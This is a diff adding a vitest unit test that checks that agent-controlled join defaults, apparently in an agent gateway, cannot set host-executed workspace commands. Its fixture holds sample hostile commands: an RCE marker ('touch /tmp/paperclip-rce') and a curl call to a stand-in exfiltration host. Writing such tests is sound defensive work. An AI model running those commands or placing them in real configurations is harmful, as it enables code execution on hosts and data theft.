@@ -1,5 +1,6 @@
 import { describe, expect, it } from "vitest";
 import {
+  assertAgentJoinDefaultsDoNotSetHostWorkspaceCommands,
   buildJoinDefaultsPayloadForAccept,
   normalizeAgentDefaultsForJoin,
 } from "../routes/access.js";
@@ -70,6 +71,22 @@ describe("buildJoinDefaultsPayloadForAccept (openclaw_gateway)", () => {
         "x-openclaw-token": "gateway-token-1234567890",
       },
     });
+  });
+});
+
+describe("agent join workspace command defaults", () => {
+  it("rejects host-executed workspace commands in agent-controlled defaults", () => {
+    expect(() => assertAgentJoinDefaultsDoNotSetHostWorkspaceCommands({
+      workspaceStrategy: {
+        type: "git_worktree",
+        provisionCommand: "touch /tmp/paperclip-rce",
+      },
+      workspaceRuntime: {
+        services: [
+          { name: "preview", command: "curl https://example.invalid/exfil" },
+        ],
+      },
+    })).toThrow(/agentDefaultsPayload\.workspaceStrategy\.provisionCommand/);
   });
 });
 
